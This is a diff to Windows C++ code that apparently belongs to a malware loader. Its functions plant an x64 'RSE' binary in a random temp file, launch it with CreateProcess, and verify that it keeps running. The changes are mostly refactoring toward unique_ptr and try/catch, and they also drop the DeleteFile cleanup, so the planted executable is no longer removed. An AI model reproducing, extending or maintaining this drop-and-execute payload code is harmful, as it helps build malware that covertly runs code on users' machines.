@@ -7,7 +7,8 @@
 */
 
 #include <Windows.h>
-#include <stdexcept> // for std::runtime_error
+#include <stdexcept>
+#include <memory>
 
 #include "dbg.h"
 #include "mem.h"
@@ -90,14 +91,9 @@ BOOL wjPlantRSEFile(LPWSTR wszTargetName, ARCH_TYPE at)
 	LPVOID pVerifyFileBuff = NULL;
 	DWORD dwVerifyFileBuffLen = 0;
 
-//	DR_ACCESS_VARS dav = { 0 };
-
 	if (!wszTargetName) { DbgPrint("ERR: invalid input params"); return bRes; }
 
 	DbgPrint("target name [%ws]", wszTargetName);
-
-	// prepare sa with Everyone r/re access
-//	if (!drInitEveryoneREsa(&dav)) { DbgPrint("WARN: failed to init sa"); }
 
 	hFile = CreateFile(wszTargetName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
@@ -156,9 +152,6 @@ BOOL wjPlantRSEFile(LPWSTR wszTargetName, ARCH_TYPE at)
 
 	} // created ok
 
-	// free mem used
-//	drFreeEveryoneREsa(&dav);
-
 	return bRes;
 }
 
@@ -169,23 +162,20 @@ BOOL wjPlantRSEFile(LPWSTR wszTargetName, ARCH_TYPE at)
 BOOL _wjMakeTmpName(LPWSTR wszResBuff)
 {
 	BOOL bRes = FALSE;
-	LPWSTR wszTmpPath = NULL;
+	std::unique_ptr<WCHAR[]> wszTmpPath(new WCHAR[MAX_PATH]);
 
 	do {	// not a loop
 
 		if (!wszResBuff) { DbgPrint("ERR: invalid input params"); break; }
 
-		wszTmpPath = (LPWSTR)my_alloc(1024);
-		if (!GetTempPath(512, wszTmpPath)) { DbgPrint("ERR: GetTempPath() failed, le %p", GetLastError()); break; }
+		if (!GetTempPath(MAX_PATH, wszTmpPath.get())) { DbgPrint("ERR: GetTempPath() failed, le %p", GetLastError()); break; }
 
-		if (!GetTempFileName(wszTmpPath, NULL, 0, wszResBuff)) { DbgPrint("ERR: GetTempFileName() failed, le %p", GetLastError()); break; }
+		if (!GetTempFileName(wszTmpPath.get(), NULL, 0, wszResBuff)) { DbgPrint("ERR: GetTempFileName() failed, le %p", GetLastError()); break; }
 
 		// all done
 		bRes = TRUE;
 
 	} while (FALSE);	// not a loop
-
-	if (wszTmpPath) { my_free(wszTmpPath); }
 
 	return bRes;
 }
@@ -200,17 +190,20 @@ HANDLE wjMakeProcess(LPWSTR wszCmdline)
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
 
-	do {	// not a loop
-
+	try {
 		si.cb = sizeof(STARTUPINFO);
 
-		if (!CreateProcess(NULL, wszCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) { DbgPrint("ERR: CreateProcess() failed, code %p", GetLastError()); break; }
+		if (!CreateProcess(NULL, wszCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+			throw std::runtime_error("CreateProcess() failed");
+		}
 
 		DbgPrint("target process started, pid %u", pi.dwProcessId);
 
 		hRes = pi.hProcess;
-
-	} while (FALSE); // not a loop
+	}
+	catch (const std::exception& e) {
+		DbgPrint("Exception: %s", e.what());
+	}
 
 	return hRes;
 }
@@ -227,7 +220,7 @@ VOID wjWow64JumpTo64()
 {
 	BOOL bRes = FALSE;
 
-	LPWSTR wszTmpName = NULL;	// buffer with tmp filename generated
+	std::unique_ptr<WCHAR[]> wszTmpName(new WCHAR[MAX_PATH]);	// buffer with tmp filename generated
 	HANDLE hProcess = NULL;	// resulting created process
 
 	LPVOID pResBuff = NULL;	// resulting binpack buffer, allocated by called function
@@ -242,14 +235,13 @@ VOID wjWow64JumpTo64()
 	do { // not a loop
 
 		// gen rnd tmp filename
-		wszTmpName = (LPWSTR)my_alloc(1024);
-		if (!_wjMakeTmpName(wszTmpName)) { DbgPrint("ERR: gen tmp fname failed"); break; }
+		if (!_wjMakeTmpName(wszTmpName.get())) { DbgPrint("ERR: gen tmp fname failed"); break; }
 
 		// put rse x64 with check
-		if (!wjPlantRSEFile(wszTmpName, ARCH_TYPE_X64)) { DbgPrint("ERR: failed to place rse x64"); break; }
+		if (!wjPlantRSEFile(wszTmpName.get(), ARCH_TYPE_X64)) { DbgPrint("ERR: failed to place rse x64"); break; }
 
 		// run process
-		if (!(hProcess = wjMakeProcess(wszTmpName))) { DbgPrint("ERR: failed to create process"); break; }
+		if (!(hProcess = wjMakeProcess(wszTmpName.get()))) { DbgPrint("ERR: failed to create process"); break; }
 
 		// wait a bit to make sure it is still running
 		if (WAIT_OBJECT_0 == WaitForSingleObject(hProcess, 3000)) { DbgPrint("ERR: process terminated unexpectedly"); break; }
@@ -268,7 +260,6 @@ VOID wjWow64JumpTo64()
 
 	} while (FALSE); // not a loop
 
-	if (wszTmpName) { DeleteFile(wszTmpName); my_free(wszTmpName); }
 	if (hProcess) { CloseHandle(hProcess); }
 	if (pResBuff) { my_free(pResBuff); }
 
